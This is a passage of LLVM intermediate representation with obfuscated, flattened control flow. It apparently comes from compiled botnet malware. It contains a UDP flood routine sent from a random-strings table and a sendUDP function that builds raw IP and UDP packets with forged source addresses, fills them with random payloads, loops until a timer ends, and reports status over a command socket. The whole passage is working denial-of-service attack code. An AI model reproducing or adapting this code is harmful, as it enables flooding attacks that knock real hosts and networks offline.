  store i8* %21, i8** %16, align 8
  %22 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  %23 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %24 = load i32, i32* %5, align 4
  %25 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %24) #2
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %27 = call i32 @strcmp(i8* %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.324, i32 0, i32 0)) #10
  store i32 %27, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1481732719, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1481732719, label %first
    i32 -467834680, label %30
    i32 -1140478849, label %31
    i32 -1448820761, label %38
    i32 -1910689696, label %42
    i32 1833696286, label %49
    i32 647115896, label %54
    i32 -1329111770, label %58
    i32 -261155258, label %59
    i32 -112542378, label %76
    i32 1267238655, label %80
    i32 -1248670543, label %88
    i32 -191227210, label %89
    i32 1106584420, label %90
    i32 1543105697, label %91
    i32 1500898710, label %94
    i32 1350692417, label %97
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %28 = icmp ne i32 %.reload, 0
  %29 = select i1 %28, i32 -1140478849, i32 -467834680
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  store i32 -1140478849, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = bitcast [78 x i8*]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* bitcast ([78 x i8*]* @sendSTD.randstrings to i8*), i64 624, i32 16, i1 false)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = load i32, i32* @mainCommSock, align 4
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %34, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.402, i32 0, i32 0), i8* %35, i8* %36)
  store i32 -1448820761, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 1
  %41 = select i1 %40, i32 -1910689696, i32 1833696286
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = call i32 @rand() #2
  %44 = srem i32 %43, 65535
  %45 = add nsw i32 %44, 1026
  %46 = trunc i32 %45 to i16
  %47 = call zeroext i16 @htons(i16 zeroext %46) #13
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  store i32 647115896, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %5, align 4
  %51 = trunc i32 %50 to i16
  %52 = call zeroext i16 @htons(i16 zeroext %51) #13
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  store i32 647115896, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %55, i32* %7, align 4
  %56 = icmp slt i32 %55, 0
  %57 = select i1 %56, i32 -1329111770, i32 -261155258
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -112542378, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = call i32 @rand() #2
  %61 = sext i32 %60 to i64
  %62 = urem i64 %61, 78
  %63 = getelementptr inbounds [78 x i8*], [78 x i8*]* %18, i64 0, i64 %62
  %64 = load i8*, i8** %63, align 8
  store i8* %64, i8** %16, align 8
  %65 = load i32, i32* %7, align 4
  %66 = load i8*, i8** %16, align 8
  %67 = load i8*, i8** %16, align 8
  %68 = call i64 @strlen(i8* %67) #10
  %69 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %70 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  store %struct.sockaddr* %70, %struct.sockaddr** %69, align 8
  %71 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %72 = load %struct.sockaddr*, %struct.sockaddr** %71, align 8
  %73 = call i64 @sendto(i32 %65, i8* %66, i64 %68, i32 0, %struct.sockaddr* %72, i32 16)
  %74 = load i32, i32* %7, align 4
  %75 = call i32 @close(i32 %74)
  store i32 -112542378, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* %8, align 4
  %78 = icmp sge i32 %77, 100
  %79 = select i1 %78, i32 1267238655, i32 1543105697
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = call i64 @time(i64* null) #2
  %82 = load i64, i64* %14, align 8
  %83 = load i32, i32* %6, align 4
  %84 = sext i32 %83 to i64
  %85 = add nsw i64 %82, %84
  %86 = icmp sge i64 %81, %85
  %87 = select i1 %86, i32 -1248670543, i32 -191227210
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1500898710, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 1106584420, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 1543105697, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %8, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %8, align 4
  store i32 -1448820761, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %7, align 4
  %96 = call i32 @close(i32 %95)
  call void @exit(i32 0) #14
  unreachable

; <label>:97:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %91, %90, %89, %88, %80, %76, %59, %58, %54, %49, %42, %38, %31, %30, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.udphdr*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %10, align 4
  store i32 %37, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1319043866, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1319043866, label %first
    i32 1602591238, label %40
    i32 776374190, label %44
    i32 -1629175048, label %49
    i32 -598700862, label %55
    i32 -1070077476, label %56
    i32 -895247329, label %63
    i32 1431863594, label %68
    i32 274794600, label %71
    i32 -707575510, label %79
    i32 537627493, label %80
    i32 872507802, label %92
    i32 -1957581095, label %106
    i32 1542267943, label %110
    i32 1864691497, label %114
    i32 -1335051454, label %120
    i32 417373818, label %121
    i32 -1749275754, label %122
    i32 -1812879262, label %129
    i32 -988079208, label %133
    i32 -1260928079, label %136
    i32 1922434761, label %137
    i32 -807627127, label %142
    i32 -1686935167, label %145
    i32 995659110, label %151
    i32 -734905958, label %154
    i32 268912136, label %155
    i32 -1819991387, label %160
    i32 1045662809, label %167
    i32 378785200, label %171
    i32 382595744, label %172
    i32 1526563663, label %178
    i32 -904167070, label %218
    i32 -1844542357, label %220
    i32 -1604428001, label %225
    i32 -842863895, label %252
    i32 490394215, label %253
    i32 411348368, label %269
    i32 1117528729, label %271
    i32 -772288930, label %276
    i32 -831612134, label %303
    i32 833099160, label %309
    i32 -2112963862, label %310
    i32 -2009461688, label %311
    i32 964157748, label %318
    i32 -2125397266, label %322
    i32 2119797631, label %325
    i32 -147103696, label %327
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %38 = icmp eq i32 %.reload, 0
  %39 = select i1 %38, i32 1602591238, i32 776374190
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = call i32 @rand_cmwc()
  %42 = trunc i32 %41 to i16
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %42, i16* %43, align 2
  store i32 -1629175048, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %10, align 4
  %46 = trunc i32 %45 to i16
  %47 = call zeroext i16 @htons(i16 zeroext %46) #13
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  store i32 -1629175048, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8*, i8** %9, align 8
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %52 = call i32 @getHost(i8* %50, %struct.in_addr* %51)
  %53 = icmp ne i32 %52, 0
  %54 = select i1 %53, i32 -598700862, i32 -1070077476
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 -147103696, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %58 = getelementptr inbounds [8 x i8], [8 x i8]* %57, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 8, i32 4, i1 false)
  %59 = load i32, i32* %14, align 4
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %12, align 4
  %61 = icmp eq i32 %60, 32
  %62 = select i1 %61, i32 -895247329, i32 1922434761
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %64, i32* %19, align 4
  %65 = load i32, i32* %19, align 4
  %66 = icmp ne i32 %65, 0
  %67 = select i1 %66, i32 274794600, i32 1431863594
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* @mainCommSock, align 4
  %70 = call i32 (i32, i8*, ...) @sockprintf(i32 %69, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  store i32 -147103696, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %13, align 4
  %73 = add nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  %75 = call noalias i8* @malloc(i64 %74) #2
  store i8* %75, i8** %20, align 8
  %76 = load i8*, i8** %20, align 8
  %77 = icmp eq i8* %76, null
  %78 = select i1 %77, i32 -707575510, i32 537627493
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 -147103696, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i8*, i8** %20, align 8
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  %84 = sext i32 %83 to i64
  call void @llvm.memset.p0i8.i64(i8* %81, i8 0, i64 %84, i32 1, i1 false)
  %85 = load i8*, i8** %20, align 8
  %86 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %85, i32 %86)
  %87 = call i64 @time(i64* null) #2
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 872507802, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i32, i32* %19, align 4
  %94 = load i8*, i8** %20, align 8
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %98 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %98, %struct.sockaddr** %97, align 8
  %99 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %100 = load %struct.sockaddr*, %struct.sockaddr** %99, align 8
  %101 = call i64 @sendto(i32 %93, i8* %94, i64 %96, i32 0, %struct.sockaddr* %100, i32 16)
  %102 = load i32, i32* %22, align 4
  %103 = load i32, i32* %18, align 4
  %104 = icmp eq i32 %102, %103
  %105 = select i1 %104, i32 -1957581095, i32 -1749275754
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = icmp eq i32 %107, 0
  %109 = select i1 %108, i32 1542267943, i32 1864691497
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = call i32 @rand_cmwc()
  %112 = trunc i32 %111 to i16
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %112, i16* %113, align 2
  store i32 1864691497, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = call i64 @time(i64* null) #2
  %116 = load i32, i32* %21, align 4
  %117 = sext i32 %116 to i64
  %118 = icmp sgt i64 %115, %117
  %119 = select i1 %118, i32 -1335051454, i32 417373818
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -1260928079, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 872507802, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %22, align 4
  %124 = add i32 %123, 1
  store i32 %124, i32* %22, align 4
  %125 = load i32, i32* %23, align 4
  %126 = load i32, i32* %15, align 4
  %127 = icmp eq i32 %125, %126
  %128 = select i1 %127, i32 -1812879262, i32 -988079208
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %16, align 4
  %131 = mul nsw i32 %130, 1000
  %132 = call i32 @usleep(i32 %131)
  store i32 0, i32* %23, align 4
  store i32 872507802, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %23, align 4
  %135 = add i32 %134, 1
  store i32 %135, i32* %23, align 4
  store i32 872507802, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  store i32 -147103696, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %138, i32* %25, align 4
  %139 = load i32, i32* %25, align 4
  %140 = icmp ne i32 %139, 0
  %141 = select i1 %140, i32 -1686935167, i32 -807627127
  store i32 %141, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i32, i32* @mainCommSock, align 4
  %144 = call i32 (i32, i8*, ...) @sockprintf(i32 %143, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  store i32 -147103696, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %26, align 4
  %146 = load i32, i32* %25, align 4
  %147 = bitcast i32* %26 to i8*
  %148 = call i32 @setsockopt(i32 %146, i32 0, i32 3, i8* %147, i32 4) #2
  %149 = icmp slt i32 %148, 0
  %150 = select i1 %149, i32 995659110, i32 -734905958
  store i32 %150, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i32, i32* @mainCommSock, align 4
  %153 = call i32 (i32, i8*, ...) @sockprintf(i32 %152, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  store i32 -147103696, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  store i32 50, i32* %27, align 4
  store i32 268912136, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32, i32* %27, align 4
  %157 = add nsw i32 %156, -1
  store i32 %157, i32* %27, align 4
  %158 = icmp ne i32 %156, 0
  %159 = select i1 %158, i32 -1819991387, i32 1045662809
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call i64 @time(i64* null) #2
  %162 = call i32 @rand_cmwc()
  %163 = zext i32 %162 to i64
  %164 = xor i64 %161, %163
  %165 = trunc i64 %164 to i32
  call void @srand(i32 %165) #2
  %166 = call i32 @rand() #2
  call void @init_rand(i32 %166)
  store i32 268912136, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i32, i32* %12, align 4
  %169 = icmp eq i32 %168, 0
  %170 = select i1 %169, i32 378785200, i32 382595744
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  store i32 0, i32* %28, align 4
  store i32 1526563663, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %12, align 4
  %174 = sub nsw i32 32, %173
  %175 = shl i32 1, %174
  %176 = sub nsw i32 %175, 1
  %177 = xor i32 %176, -1
  store i32 %177, i32* %28, align 4
  store i32 1526563663, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i32, i32* %13, align 4
  %180 = sext i32 %179 to i64
  %181 = add i64 28, %180
  store i64 %181, i64* %.reg2mem2
  %182 = call i8* @llvm.stacksave()
  store i8* %182, i8** %29, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %183 = alloca i8, i64 %.reload4, align 16
  store i8* %183, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %184 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %184, %struct.iphdr** %30, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %186 = bitcast %struct.iphdr* %185 to i8*
  %187 = getelementptr i8, i8* %186, i64 20
  %188 = bitcast i8* %187 to %struct.udphdr*
  store %struct.udphdr* %188, %struct.udphdr** %31, align 8
  %189 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %191 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 4
  %193 = load i32, i32* %28, align 4
  %194 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %193)
  %195 = call i32 @htonl(i32 %194) #13
  %196 = load i32, i32* %13, align 4
  %197 = sext i32 %196 to i64
  %198 = add i64 8, %197
  %199 = trunc i64 %198 to i32
  call void @makeIPPacket(%struct.iphdr* %189, i32 %192, i32 %195, i8 zeroext 17, i32 %199)
  %200 = load i32, i32* %13, align 4
  %201 = sext i32 %200 to i64
  %202 = add i64 8, %201
  %203 = trunc i64 %202 to i16
  %204 = call zeroext i16 @htons(i16 zeroext %203) #13
  %205 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %206 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.3* %206 to %struct.anon.4*
  %208 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %207, i32 0, i32 2
  store i16 %204, i16* %208, align 2
  %209 = call i32 @rand_cmwc()
  %210 = trunc i32 %209 to i16
  %211 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon.3* %212 to %struct.anon.4*
  %214 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %213, i32 0, i32 0
  store i16 %210, i16* %214, align 2
  %215 = load i32, i32* %10, align 4
  %216 = icmp eq i32 %215, 0
  %217 = select i1 %216, i32 -904167070, i32 -1844542357
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = call i32 @rand_cmwc()
  store i32 -1604428001, i32* %switchVar
  store i32 %219, i32* %.reg2mem10
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i32, i32* %10, align 4
  %222 = trunc i32 %221 to i16
  %223 = call zeroext i16 @htons(i16 zeroext %222) #13
  %224 = zext i16 %223 to i32
  store i32 -1604428001, i32* %switchVar
  store i32 %224, i32* %.reg2mem10
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %226 = trunc i32 %.reload11 to i16
  %227 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon.3* %228 to %struct.anon.4*
  %230 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %229, i32 0, i32 1
  store i16 %226, i16* %230, align 2
  %231 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  %233 = bitcast %union.anon.3* %232 to %struct.anon.4*
  %234 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %233, i32 0, i32 3
  store i16 0, i16* %234, align 2
  %235 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %236 = bitcast %struct.udphdr* %235 to i8*
  %237 = getelementptr inbounds i8, i8* %236, i64 8
  %238 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %237, i32 %238)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %239 = bitcast i8* %.reload8 to i16*
  %240 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 2
  %242 = load i16, i16* %241, align 2
  %243 = zext i16 %242 to i32
  %244 = call zeroext i16 @csum(i16* %239, i32 %243)
  %245 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 7
  store i16 %244, i16* %246, align 2
  %247 = call i64 @time(i64* null) #2
  %248 = load i32, i32* %11, align 4
  %249 = sext i32 %248 to i64
  %250 = add nsw i64 %247, %249
  %251 = trunc i64 %250 to i32
  store i32 %251, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 0, i32* %34, align 4
  store i32 -842863895, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  store i32 490394215, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i32, i32* %25, align 4
  %255 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %256 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %256, %struct.sockaddr** %255, align 8
  %257 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %258 = load %struct.sockaddr*, %struct.sockaddr** %257, align 8
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %259 = call i64 @sendto(i32 %254, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %258, i32 16)
  %260 = call i32 @rand_cmwc()
  %261 = trunc i32 %260 to i16
  %262 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %263 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %262, i32 0, i32 0
  %264 = bitcast %union.anon.3* %263 to %struct.anon.4*
  %265 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %264, i32 0, i32 0
  store i16 %261, i16* %265, align 2
  %266 = load i32, i32* %10, align 4
  %267 = icmp eq i32 %266, 0
  %268 = select i1 %267, i32 411348368, i32 1117528729
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = call i32 @rand_cmwc()
  store i32 -772288930, i32* %switchVar
  store i32 %270, i32* %.reg2mem12
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i32, i32* %10, align 4
  %273 = trunc i32 %272 to i16
  %274 = call zeroext i16 @htons(i16 zeroext %273) #13
  %275 = zext i16 %274 to i32
  store i32 -772288930, i32* %switchVar
  store i32 %275, i32* %.reg2mem12
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %277 = trunc i32 %.reload13 to i16
  %278 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %279 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.3* %279 to %struct.anon.4*
  %281 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %280, i32 0, i32 1
  store i16 %277, i16* %281, align 2
  %282 = call i32 @rand_cmwc()
  %283 = trunc i32 %282 to i16
  %284 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 3
  store i16 %283, i16* %285, align 4
  %286 = load i32, i32* %28, align 4
  %287 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %286)
  %288 = call i32 @htonl(i32 %287) #13
  %289 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %291 = bitcast i8* %.reload6 to i16*
  %292 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 2
  %294 = load i16, i16* %293, align 2
  %295 = zext i16 %294 to i32
  %296 = call zeroext i16 @csum(i16* %291, i32 %295)
  %297 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 7
  store i16 %296, i16* %298, align 2
  %299 = load i32, i32* %33, align 4
  %300 = load i32, i32* %18, align 4
  %301 = icmp eq i32 %299, %300
  %302 = select i1 %301, i32 -831612134, i32 -2009461688
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = call i64 @time(i64* null) #2
  %305 = load i32, i32* %32, align 4
  %306 = sext i32 %305 to i64
  %307 = icmp sgt i64 %304, %306
  %308 = select i1 %307, i32 833099160, i32 -2112963862
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  store i32 2119797631, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 0, i32* %33, align 4
  store i32 -842863895, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i32, i32* %33, align 4
  %313 = add i32 %312, 1
  store i32 %313, i32* %33, align 4
  %314 = load i32, i32* %34, align 4
  %315 = load i32, i32* %15, align 4
  %316 = icmp eq i32 %314, %315
  %317 = select i1 %316, i32 964157748, i32 -2125397266
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i32, i32* %16, align 4
